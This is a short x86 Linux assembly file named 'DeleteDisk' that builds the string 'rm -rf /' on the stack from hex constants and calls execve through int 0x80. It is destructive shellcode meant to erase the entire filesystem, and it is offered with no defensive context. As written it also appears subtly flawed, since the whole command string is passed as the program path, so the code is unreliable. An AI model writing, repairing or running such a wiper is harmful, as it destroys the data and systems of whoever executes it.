; DeleteDisk.nasm
; Author: Ravehorn

global _start

section .text

_start:

    xor eax, eax
    push eax

    push 0x2f206672
    push 0x2d206d72

    mov ebx, esp

    push eax
    mov edx, esp

    push ebx
    mov ecx, esp

    mov al, 0xb
    int 0x80